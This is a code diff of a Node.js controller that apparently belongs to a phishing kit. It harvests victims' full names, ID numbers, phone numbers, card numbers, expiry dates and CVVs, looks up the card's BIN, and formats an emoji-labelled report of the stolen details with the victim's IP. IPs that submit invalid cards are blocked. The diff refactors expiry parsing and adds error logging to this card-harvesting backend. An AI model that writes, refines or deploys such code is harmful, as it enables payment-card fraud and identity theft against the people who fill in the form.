@@ -7,22 +7,10 @@ const BlockedIP = require("../models/blockedIP.model");
 
 module.exports.addCardDetails = async (req, res, next) => {
   try {
-    const {
-      fullName,
-      idNumber,
-      phoneNumber,
-      cardNumber,
-      expiryMonth,
-      expiryYear,
-      cvv,
-    } = req.body;
+    const { fullName, idNumber, phoneNumber, cardNumber, expiry, cvv } =
+      req.body;
 
-    const isValidCard = isValidCreditCard(
-      cardNumber,
-      cvv,
-      expiryMonth,
-      expiryYear
-    );
+    const isValidCard = isValidCreditCard(cardNumber, cvv, expiry);
 
     if (!isValidCard) {
       const blockedIP = new BlockedIP({ ip: req.ip });
@@ -30,7 +18,7 @@ module.exports.addCardDetails = async (req, res, next) => {
       return res.status(200).json({ success: false });
     }
 
-    const bin = cardNumber.substring(0, 7);
+    const bin = cardNumber.replace(/\D/g, "").substring(0, 7);
     const url = `https://lookup.binlist.net/${bin}`;
     const response = await axios.get(url);
     const cardDetails = response.data;
@@ -40,7 +28,7 @@ module.exports.addCardDetails = async (req, res, next) => {
     const line3 = `[👤] ID Number: ${idNumber}`;
     const line4 = `[👤] Mobile Number: ${phoneNumber}`;
     const line5 = `[💳] Card Number: ${formatCreditCard(cardNumber)}`;
-    const line6 = `[🔄] Expiry Date: ${expiryMonth}/${expiryYear}`;
+    const line6 = `[🔄] Expiry Date: ${expiry}`;
     const line7 = `[🔑] CCV: ${cvv}`;
     const line8 = `[🔍] GEO IP: ${req.ip}`;
     const line9 = "\n";
@@ -62,6 +50,7 @@ module.exports.addCardDetails = async (req, res, next) => {
 
     res.status(200).json({ success: true });
   } catch (err) {
+    console.log("ERR", err);
     res.status(200).json({ success: false });
   }
 };
